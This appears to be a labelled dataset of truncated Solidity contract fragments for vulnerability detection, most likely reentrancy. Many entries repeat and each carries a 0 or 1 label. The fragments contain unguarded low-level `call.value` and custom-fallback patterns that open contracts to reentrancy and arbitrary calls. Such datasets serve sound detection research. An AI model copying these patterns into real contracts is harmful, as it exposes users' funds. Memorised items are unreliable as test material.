TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1182 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1183 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1184 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1185 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1186 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1187 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1188 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1189 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1190 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1191 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1192 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1193 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1194 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1195 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1196 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1197 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1198 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1199 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1200 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1201 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1202 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1203 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1204 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
1205 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
1206 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
1207 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
1208 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
1209 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
1210 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
1211 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
1212 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1213 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
